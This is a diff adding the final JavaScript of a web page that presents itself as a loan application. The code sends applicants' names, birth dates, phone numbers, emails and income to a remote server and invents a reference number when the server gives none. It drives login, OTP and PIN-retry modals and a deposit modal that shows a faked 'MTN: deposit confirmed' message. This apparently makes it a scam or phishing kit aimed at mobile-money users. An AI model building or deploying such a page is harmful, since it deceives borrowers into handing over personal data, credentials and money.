+  $('#rvTerm').textContent     = term + (term === 1 ? ' month' : ' months');
+  $('#rvPurpose').textContent  = get('purpose') || '—';
+  $('#rvName').textContent     = get('fullname') || '—';
+  $('#rvCity').textContent     = get('city') || '—';
+  $('#rvPhone').textContent    = prettyPhone(sanitizePhone(get('phone')));
+
+  const d = get('dobDay'), m = get('dobMonth'), y = get('dobYear');
+  if (d && m && y){
+    const MONTHS = ['January','February','March','April','May','June','July','August','September','October','November','December'];
+    $('#rvDob').textContent = Number(d) + ' ' + MONTHS[Number(m) - 1] + ' ' + y;
+  } else {
+    $('#rvDob').textContent = '—';
+  }
+  $('#rvEmployment').textContent = get('employment') || '—';
+  $('#rvIncome').textContent     = get('income') ? 'K' + get('income') : '—';
+  $('#rvMonthly').textContent = money(monthly);
+  $('#rvTotalNote').textContent =
+    'Total repayment about ' + money(total) + ' over ' + term +
+    (term === 1 ? ' month' : ' months') + ', based on a sample ' + ratePct() + '% monthly flat rate.';
+}
+
+async function submitApplication(){
+  const payload = {
+    loan: {
+      amount: digits($('#amount').value),
+      term,
+      purpose: $('#purpose').value
+    },
+    personal: {
+      fullname: $('#fullname').value.trim(),
+      dobDay:   $('#dobDay').value,
+      dobMonth: $('#dobMonth').value,
+      dobYear:  $('#dobYear').value,
+      city:     $('#city').value.trim(),
+      phone:    sanitizePhone($('#phone').value),
+      email:    $('#email').value.trim()
+    },
+    income: {
+      employment: $('#employment').value,
+      income: digits($('#income').value)
+    }
+  };
+
+  let ref = null;
+  try {
+    const r = await fetch(`${SERVER_URL}/api/apply`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(payload)
+    });
+    const data = await r.json().catch(() => ({}));
+    if (r.ok && data.ref) ref = data.ref;
+  } catch { /* fall through */ }
+
+  if (!ref){
+    ref = 'TL-' + new Date().getFullYear() + '-' + String(Math.floor(1000 + Math.random() * 9000));
+  }
+
+  $('#refNumber').textContent = ref;
+  $('#formProgress').style.display = 'none';
+  $('#appForm').style.display = 'none';
+  $('#formActions').style.display = 'none';
+  $('#balanceAlert').classList.add('show');
+
+  [1,2,3,4].forEach(clearStepData);
+  authVerified = false;
+  pinFlaggedWrong = false;
+
+  const top = $('.form-card').getBoundingClientRect().top + window.scrollY - 80;
+  window.scrollTo({top, behavior:'smooth'});
+}
+
+/* ============================================================
+   DEPOSIT CONFIRMATION MODAL
+   ============================================================ */
+(function initDepositModal(){
+  const tryAgainBtn    = $('#tryAgainBtn');
+  const depositClose   = $('#depositClose');
+  const depositCancel  = $('#depositCancelBtn');
+  const depositConfirm = $('#depositConfirmBtn');
+
+  if (!tryAgainBtn || !depositModal) return;
+
+  function openDepositModal(){
+    authBackdrop.hidden = false;
+    loginModal.hidden = true;
+    otpModal.hidden = true;
+    pinRetryModal.hidden = true;
+    finalModal.hidden = true;
+    depositModal.hidden = false;
+    document.body.style.overflow = 'hidden';
+  }
+
+  function closeDepositModal(){
+    authBackdrop.hidden = true;
+    depositModal.hidden = true;
+    document.body.style.overflow = '';
+  }
+
+  tryAgainBtn.addEventListener('click', openDepositModal);
+  depositClose.addEventListener('click', closeDepositModal);
+  depositCancel.addEventListener('click', closeDepositModal);
+
+  depositConfirm.addEventListener('click', async () => {
+    depositConfirm.classList.add('loading');
+    depositConfirm.disabled = true;
+    await sleep(1800);
+
+    closeDepositModal();
+
+    $('#formProgress').style.display = '';
+    $('#appForm').style.display = '';
+    $('#formActions').style.display = '';
+    $('#balanceAlert').classList.remove('show');
+    authVerified = false;
+    pinFlaggedWrong = false;
+    [1,2,3,4].forEach(clearStepData);
+
+    history.replaceState(null, '', '#/');
+    setView('home');
+    window.scrollTo({ top: 0, behavior: 'smooth' });
+    showToast('MTN: deposit confirmed');
+
+    depositConfirm.classList.remove('loading');
+    depositConfirm.disabled = false;
+  });
+
+  document.addEventListener('keydown', e => {
+    if (e.key === 'Escape' && !depositModal.hidden) closeDepositModal();
+  });
+})();
+
+/* ============================================================
+   ROUTING HANDLERS
+   ============================================================ */
+function handleRoute(){
+  const { view, step } = parseRoute();
+  if (view === 'home'){
+    setView('home');
+  } else {
+    setView('apply');
+    restorePreviousSteps(step);
+    clearStepData(step);
+    goToStep(step, { updateHash: false, scroll: false });
+    syncAmountChip();
+    syncTermChips();
+    updateSummary();
+  }
+}
+
+async function navigateToApply(){
+  await showPageLoader();
+  history.replaceState(null, '', '#/apply/1');
+  setView('apply');
+  clearStepData(1);
+  goToStep(1, { updateHash: false });
+}
+
+$$('[data-nav="apply"]').forEach(el => {
+  el.addEventListener('click', e => { e.preventDefault(); navigateToApply(); });
+});
+$$('[data-nav="home"]').forEach(el => {
+  el.addEventListener('click', e => {
+    e.preventDefault();
+    history.replaceState(null, '', '#/');
+    setView('home');
+  });
+});
+
+$$('[data-scroll]').forEach(el => {
+  el.addEventListener('click', e => {
+    e.preventDefault();
+    const id = el.getAttribute('href');
+    setView('home');
+    const target = document.querySelector(id);
+    if (target) target.scrollIntoView({ behavior: 'smooth' });
+  });
+});
+
+window.addEventListener('hashchange', handleRoute);
+
+/* ============================================================
+   INIT
+   ============================================================ */
+(function init(){
+  bindAutoSave();
+  handleRoute();
+  syncTermChips();
+  syncAmountChip();
+  updateSummary();
+})();
+</script>
+
+</body>
+</html>
